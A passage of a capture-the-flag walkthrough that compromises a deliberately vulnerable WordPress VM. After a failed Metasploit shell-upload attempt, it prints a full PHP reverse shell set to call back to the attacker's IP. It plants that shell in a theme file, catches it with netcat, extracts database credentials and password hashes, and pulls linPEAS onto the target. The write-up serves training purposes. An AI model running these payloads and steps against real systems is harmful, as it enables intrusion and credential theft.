   12  exploit/unix/http/pihole_dhcp_mac_exec                         2020-03-28       good       Yes    Pi-Hole DHCP MAC OS Command Execution
   13  exploit/linux/misc/quest_pmmasterd_bof                         2017-04-09       normal     Yes    Quest Privilege Manager pmmasterd Buffer Overflow
   14  exploit/windows/http/sws_connection_bof                        2012-07-20       normal     Yes    Simple Web Server Connection Header Buffer Overflow
   15  exploit/multi/php/wp_duplicator_code_inject                    2018-08-29       manual     Yes    Snap Creek Duplicator WordPress plugin code injection
   16  exploit/multi/http/wp_db_backup_rce                            2019-04-24       excellent  Yes    WP Database Backup RCE
   17  exploit/windows/fileformat/winrar_name_spoofing                2009-09-28       excellent  No     WinRAR Filename Spoofing
   18  post/windows/gather/credentials/razer_synapse                                   normal     No     Windows Gather Razer Synapse Password Extraction
   19  exploit/multi/http/wp_ait_csv_rce                              2020-11-14       excellent  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution
   20  exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
   21  auxiliary/gather/wp_all_in_one_migration_export                2015-03-19       normal     Yes    WordPress All-in-One Migration Export
   22  exploit/unix/webapp/wp_asset_manager_upload_exec               2012-05-26       excellent  Yes    WordPress Asset-Manager PHP File Upload Vulnerability
   23  auxiliary/scanner/http/wordpress_login_enum                                     normal     No     WordPress Brute Force and User Enumeration Utility
   24  auxiliary/scanner/http/wordpress_cp_calendar_sqli              2015-03-03       normal     No     WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner
   25  auxiliary/scanner/http/wp_chopslider_id_sqli                   2020-05-12       normal     No     WordPress ChopSlider3 id SQLi Scanner
```

<p></p>
Looking through the results number 20 looks interesting, lets find out some more info on it using the following command:
<p></p>

```
info 20
```

<p></p>
Which outputs:
<p></p>

```
msf6 > info 20

       Name: WordPress Admin Shell Upload
     Module: exploit/unix/webapp/wp_admin_shell_upload
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-02-21

Provided by:
  rastating

Available targets:
  Id  Name
  --  ----
  0   WordPress

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                    yes       The WordPress password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  USERNAME                    yes       The WordPress username to authenticate with
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module will generate a plugin, pack the payload into it and 
  upload it to a server running WordPress providing valid admin 
  credentials are used.
```

<p></p>
We can see the description at the bottom of the output and this looks like it could be useful so lets use it, to do this we enter the following command:
<p></p>

```
use 20
```

<p></p>
next we are presented with a changed command line so we need to enter 'show options' and are presented with the following:
<p></p>

```
msf6 > use 20
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.125.135  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /secret          yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.125.134  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

<p></p>
Yours will have blank space next to most of the fields, IOT change them you need to enter set + feild + value ie.
<p></p>

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password admin
password => admin

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.125.135
rhosts => 192.168.125.135

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /secret
targeturi => /secret

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
username => admin

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 192.168.125.134
lhost => 192.168.125.134
```

<p></p>
Then simply enter exploit and hopefully you are presented with a shell instead of an error.
<p></p>


```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.125.134:4444 
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Acquired a plugin upload nonce: 4f8184143b
[-] Failed to upload plugin AFyvBhdZph
[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[*] Exploit completed, but no session was created.
```

<p></p>
But hey, this is why you have different tools in your arsenel because your normal methods may not always work, so I will show you how to do a simple php reverse shell upload and hopefully we can get in that way (if msf worked for you congrats, read through the following if you want otherwise skip to the next part).
<p></p>
Since msf didn't work I will go through usisng a preconfigured php reverse shell (if you want to learn how to create your own shell refer to my Mr Robot <a href="https://github.com/Shadow-Admins/Cyber_Club/tree/main/Starting_Point/VulnHub/MrRobot" rel="nofollow">writeup</a>) to start we need to obtain the reverse shell script, if you are using Parrot or kali it comes on the distro by defualt otherwise you can download it from <a href="https://github.com/pentestmonkey/php-reverse-shell" rel="nofollow">here</a> to download it run the following command:
<p></p>

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

<p></p>
If you are using Parrot or kali it is located in:
<p></p>

```
/usr/share/webshells/php/php-reverse-shell.php
```

<p></p>
You can create a copy of this file in your working directory by using the following command:
<p></p>

```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

<p></p>
Once we have a fresh copy of this file we want to edit it with a next editor like nano, vim,vi etc. Lets have a look at the script.
<p></p>

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

<p></p>
Looking through this script there are only two things we need to change.
<p></p>

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

<p></p>
This part is found at the very top of the file, we need to change this to our ip address and a port that we pick. ie.
<p></p>

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.125.134';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

<p></p>
Once we have changed these two parts in the script we need to upload it to the site, to do this we need to navigate to appearance editor.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/bddaddee80dd9cfed30392832bf33155feede284/Starting_Point/VulnHub/BasicPentesting1/images/wpeditor.png"><br>
</div>
<p></p>
We then need to select the theme to edit, I will use the twentyfifteen theme.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/bddaddee80dd9cfed30392832bf33155feede284/Starting_Point/VulnHub/BasicPentesting1/images/wpselecttheme.png"><br>
</div>
<p></p>
Next we need to select the .php file we want to edit, I will be editing the 404.php file.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/bddaddee80dd9cfed30392832bf33155feede284/Starting_Point/VulnHub/BasicPentesting1/images/wpthemefile.png"><br>
</div>
<p></p>
And finally we need to delete all the existing code in the file and replace it with out php reverse shell code.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/c248ddd6e4649113df59ee387e6e9725e493612b/Starting_Point/VulnHub/BasicPentesting1/images/wpphpupload.png"><br>
</div>
<p></p>
Once we have coppied our shell script we need to click update file, this is all we need to do with the website all we need to do now is set up a listner on our machine IOT catch the reverse shell and then navigate to the reverse shell file in our browser to initiate the connection. Lets set up our listner, we are going to use netcat to do this in our terminal, the command we use is:
<p></p>

```
nc -nvlp 1337
```

<p></p>
Once we run this it looks like the program hangs, this is because it is waiting for a connection which we will initiate in the next step. First lets go over what this command is doing. The <kbd>-n</kbd> flag is telling nc to only pay attention to numeric-only IP addresses, no DNS the <kbd>-v</kbd> flag is telling nc to output verbose information, the <kbd>-l</kbd> flag is telling nc to be in listen mode, waiting for inbound connections and the <kb>-p</kb> flag is telling nc local port number to listen on.
<p></p>
Now that we have our listner waiting for a connection lets initiate that by navigating to the 404.php file that we edited earlier. To do this we will navigate to the following address:
<p></p>

```
192.168.125.135/secret/wp-content/themes/twentyfifteen/404.php
```

<p></p>
When we navigate to this website it looks like it hangs, however if we change back to our terminal we can see that something has happened to our nc listner.
<p></p>

```
❯ nc -nvlp 1337
listening on [any] 1337 ...
connect to [192.168.125.134] from (UNKNOWN) [192.168.125.135] 46210
Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:43:53 up 22 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

<p></p>
We can see that we have successfully gained access to our target VM! But what do we need to do now? The first thing I want to do is get a propper TTY shell, I will then want to enumerate the system as I know from the challenge description that the only flag is located in the root folder and I will need to carry out priveledge escalation IOT access it.
<p></p>
Lets carry out our first task of gaining a propper TTY shell as usual lets reference one of my favourite sites <a href="https://book.hacktricks.xyz/shells/shells/full-ttys" rel="nofollow">HackTricks</a> to see how to get a full TTY:
<p></p>

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

<p></p>
Above are the commands it gives for creating a full TTY shell so lets enter them and see how it changes our shell. After entering the first line of commands we can see how our comman line changes.
<p></p>

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@vtcsec:/$ 
```

<p></p>
The second line of code is to make it so you have tab auto complete (this is optional and I rarely do it however its up to you).
<p></p>
Now that we have a shell we can begin enumerating it to find a route to carry out priv esc. Again refer to <a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist" rel="nofollow">HackTricks linux priv esc checklist</a> and <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation" rel="nofollow">HackTricks linux priv esc commands</a>. These two sites explain to you the manual way to enumerate a system we will use a couple of these commands however I am going to show you how to run a script to automatically enumerate the system.
<p></p>
I am including this part as a bit of bonus knowledge as it leads to a dead end however I wanted to wrap up word press hacking and what to do post exploitation, that is enumerating the database to pull usernames and passwords. (feel free to go over this or skip)
<p></p>
<details>
  <summary>WordPress database user/pass extraction</summary>
<p></p>
This information again comes from the HackTricks page on <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#post-exploitation" rel="nofollow">WordPress</a>. The first thing we need to do is navigate to where the wordpress files are located so we can read the wp-config.php file. This file is located at:
<p></p>

```
/var/www/html/secret/wp-content.php
```

<p></p>
Now we know where it is located we can read it to get the information we need.
<p></p>

```
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_myblog');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'arootmysqlpass');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

<p></p>
And this is the important information we need:
<p></p>

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_myblog');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'arootmysqlpass');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

<p></p>
Now that we have the database information we can input it into the mysql command supplied by HackTricks.
<p></p>

```
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```

<p></p>
Inputting the information from the file the command looks like this:
<p></p>

```
mysql -u root --password=arootmysqlpass -h localhost -e "use wp_myblog;select concat_ws(':', user_login, user_pass) from wp_users;"
```

<p></p>
Which outputs:
<p></p>

```
www-data@vtcsec:/var/www/html/secret$ mysql -u root --password=arootmysqlpass -h localhost -e "use wp_myblog;select concat_ws(':', user_login, user_pass) from wp_users;"
<log;select concat_ws(':', user_login, user_pass) from wp_users;"            
mysql: [Warning] Using a password on the command line interface can be insecure.
+------------------------------------------+
| concat_ws(':', user_login, user_pass)    |
+------------------------------------------+
| admin:$P$BAJWheLsI9IEVX0o4/5OBbGo2n4YuD1 |
+------------------------------------------+
```

<p></p>
Only the admin user we found previously was returned, we could decrypt the password however we already know that the password is 'admin' so this is a dead end for us, however its just more knowledge for you.
</details>
<p></p>
Lets begin our enumeration by looking for what users are on this system.
<p></p>

```
www-data@vtcsec:/var/www/html/secret$ cd /home
cd /home
www-data@vtcsec:/home$ ls
ls
marlinspike
www-data@vtcsec:/home$ 
```

<p></p>
We can see that there is a user called marlinspike lets see if we can access his folder and see if anything of use is in there.
<p></p>

```
www-data@vtcsec:/home$ cd marlinspike
cd marlinspike
www-data@vtcsec:/home/marlinspike$ ls
ls
046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz
046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz.bak
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backdoored_proftpd-1.3.3c
examples.desktop
latest.tar.gz
proftpd-1.3.3c
proftpd-1.3.3c.tar.bz2
proftpd-1.3.3c.tar.bz2.bak
wordpress
```

<p></p>
Lets look at everything
<p></p>

```
www-data@vtcsec:/home/marlinspike$ ls -a *
ls -a *
046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz
046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz.bak
examples.desktop
latest.tar.gz
proftpd-1.3.3c.tar.bz2
proftpd-1.3.3c.tar.bz2.bak

Desktop:
.  ..

Documents:
.  ..

Downloads:
.  ..  046e85f6fe460de94fd46198feef4d07-backdoored_proftpd-1.3.3c.tar.gz

Music:
.  ..

Pictures:
.  ..

Public:
.  ..

Templates:
.  ..

Videos:
.  ..

backdoored_proftpd-1.3.3c:
.		README.IPv6	     config.h.in    libtool
..		README.LDAP	     config.log     locale
.autom4te.cfg	README.PAM	     config.status  ltmain.sh
.libs		README.Solaris2.5x   config.sub     m4
COPYING		README.Unixware      configure	    modules
CREDITS		README.capabilities  configure.in   proftpd
ChangeLog	README.classes	     contrib	    proftpd.pc
INSTALL		README.controls      doc	    proftpd.spec
Make.rules	README.cygwin	     ftpcount	    sample-configurations
Make.rules.in	README.facl	     ftpdctl	    src
Makefile	README.modules	     ftpscrub	    stamp-h
Makefile.in	README.ports	     ftpshut	    stamp-h.in
NEWS		RELEASE_NOTES	     ftptop	    tests
README		acconfig.h	     ftpwho	    utils
README.AIX	aclocal.m4	     include
README.DSO	config.guess	     install-sh
README.FreeBSD	config.h	     lib

proftpd-1.3.3c:
.		README.IPv6	     config.h.in    libtool
..		README.LDAP	     config.log     locale
.autom4te.cfg	README.PAM	     config.status  ltmain.sh
.libs		README.Solaris2.5x   config.sub     m4
COPYING		README.Unixware      configure	    modules
CREDITS		README.capabilities  configure.in   proftpd
ChangeLog	README.classes	     contrib	    proftpd.pc
INSTALL		README.controls      doc	    proftpd.spec
Make.rules	README.cygwin	     ftpcount	    sample-configurations
Make.rules.in	README.facl	     ftpdctl	    src
Makefile	README.modules	     ftpscrub	    stamp-h
Makefile.in	README.ports	     ftpshut	    stamp-h.in
NEWS		RELEASE_NOTES	     ftptop	    tests
README		acconfig.h	     ftpwho	    utils
README.AIX	aclocal.m4	     include
README.DSO	config.guess	     install-sh
README.FreeBSD	config.h	     lib

wordpress:
.		 wp-admin	       wp-includes	  wp-signup.php
..		 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
index.php	 wp-comments-post.php  wp-load.php	  xmlrpc.php
license.txt	 wp-config-sample.php  wp-login.php
readme.html	 wp-content	       wp-mail.php
wp-activate.php  wp-cron.php	       wp-settings.php
```

<p></p>
Nothing that will help us here, lets now look for binaries with SUID permissions. The two commands we will look at are:
<p></p>

```
find / -perm -u=s -type f 2>/dev/null
```

<p></p>
Which outputs:
<p></p>

```
www-data@vtcsec:/home/marlinspike$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/bin/ping6
/bin/fusermount
/bin/umount
/bin/su
/bin/ping
/bin/mount
/bin/ntfs-3g
```

<p></p>
Or:
<p></p>

```
find / -perm -4000 2>/dev/null
```

<p></p>
Which outputs:
<p></p>

```
www-data@vtcsec:/home/marlinspike$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/bin/ping6
/bin/fusermount
/bin/umount
/bin/su
/bin/ping
/bin/mount
/bin/ntfs-3g
```

<p></p>
You can use either one, one key file sticks out to me, but you can look at <a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a> to test for binary exploits for each of these. For now we will move onto the automated script I discussed earlier. 
<p></p>
To carry out this enumeration we are going to use a script called linPEAS.sh. This is an essential tool to have in your arsenel and knowing how to get it onto a target system is pivital... to start with you need to get the script, which you can get by running the following command on your attack machine:
<p></p>

```
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
```

<p></p>
Which outputs:
<p></p>

```
❯ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
Cloning into 'privilege-escalation-awesome-scripts-suite'...
remote: Enumerating objects: 6225, done.
remote: Counting objects: 100% (993/993), done.
remote: Compressing objects: 100% (252/252), done.
remote: Total 6225 (delta 774), reused 842 (delta 726), pack-reused 5232
Receiving objects: 100% (6225/6225), 33.76 MiB | 11.98 MiB/s, done.
Resolving deltas: 100% (3687/3687), done.
```

<p></p>
So we have our enumeration script but how do we get it onto our target VM? First we need to navigate into the directory that holds linpeas.sh and then we will start up a http server. To do this we use this command (it has to be run in the directory that holds the file we want to serve!):
<p></p>

```
python -m http.server 8080
```

<p></p>
In this command we are using python to call a module using the <kbd>-m</kbd> flag and the module we are going to use is the http.server module, then all we need to do is give the server a port to serve on, 8080 in this case (alot of the time it is good to use common ports ie. 80,443,8080 as these are rarely blocked by firewalls). This command outputs the following:
<p></p>

```
❯ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

<p></p>
Great so our server is up, we can leave it be now as everything further is carried out on the target VM.
<p></p>
Switching to our target VM we need to pull that linpeas.sh file across we do this using one of two commands, being wget or curl (its good to know how to use both of these commands for this task as occasionally one will be blocked on the system). We will start with wget (ensure you change into the /tmp directory so you have write permissions) the command we are going to use is:
<p></p>

```
wget http://192.168.125.134:8080/linpeas.sh
```

<p></p>
In this command we direct wget to our ip address followed by the port we started our server on and finall  a '/' followed by the file we wish to pull accross. This command outputs:
<p></p>
So lets try pulling linpeas.sh accross again. We cd to the /tmp directory and then re-run our original command which outputs:
<p></p>

```
www-data@vtcsec:/tmp$ wget 192.168.125.134:8080/linpeas.sh
wget 192.168.125.134:8080/linpeas.sh
--2021-07-13 07:31:39--  http://192.168.125.134:8080/linpeas.sh
Connecting to 192.168.125.134:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 462687 (452K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 451.84K  --.-KB/s    in 0.009s  

2021-07-13 07:31:39 (51.9 MB/s) - 'linpeas.sh' saved [462687/462687]
```

<p></p>
Success! lets confirm it worked by running <kbd>head</kbd> on our new file.
<p></p>

```
www-data@vtcsec:/tmp$ head linpeas.sh
head linpeas.sh
#!/bin/sh

VERSION="v3.2.6"
ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."

###########################################
#-------) Checks pre-everything (---------#
###########################################
if [ "$(/usr/bin/id -u)" -eq "0" ]; then
  IAMROOT="1"
```

<p></p>
Good it worked, occasionally you will pull a file accross and it will be empty or hove random data in it because something went wrong so its always good to check!
<p></p>
So we have successfully used wget to pull a file across lets also look at how to do it using curl. The command we will use is:
<p></p>

```
curl http://192.168.125.134:8080/linpeas.sh -o linpeas.sh
```

<p></p>
This command is almost identical to wget however we need to specify an output file, in this case linpeas.sh. This outputs:
<p></p>

```
www-data@vtcsec:/tmp$ curl http://192.168.125.134:8080/linpeas.sh -o linpeas.sh                
<http://192.168.125.134:8080/linpeas.sh -o linpeas.sh                        
The program 'curl' is currently not installed. To run 'curl' please ask your administrator to install the package 'curl'
```

<p></p>
This is a perfect example of why it's good to know both methods as you can see wget is available however curl isn't.
<p></p>
Now that we have successfully pulled linpeas.sh across it is time to use it to enumerate the target VM. To do that we use the following command:
<p></p>

```
./linpeas.sh | tee lin.txt
```

<p></p>
This is the same as normally running a script however you can see that I have piped (|) it to <kbd>tee</kbd> and named an output text file in this case lin.txt. I pipe to tee as this both displays the output on the screen as it is occuring while also writting to a file that I can review later, this saves me needing to rerun the script each time. THis outputs:
<p></p>

```
robot@linux:/tmp$ ./linpeas.sh | tee lin.txt
./linpeas.sh | tee lin.txt
bash: ./linpeas.sh: Permission denied
```

<p></p>
Permission denied, this is an easy fix. This occured because currently the file doesnt have execute permissions which we can add by running the following command:
<p></p>

```
chmod +x linpeas.sh
```

<p></p>
And if we re-run the command now we can see that it works!
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/71d8717df5762834badd78ab879f83a5541503b1/Starting_Point/VulnHub/BasicPentesting1/images/peas.png"><br>
</div>
<p></p>
The important thing obout linpeas is the legend at the top of the script.
<p></p>

```
 LEGEND:                                                                                                                                                                                      
  RED/YELLOW: 95% a PE vector                                                                                                                                                                 
  RED: You should take a look to it                                                                                                                                                           
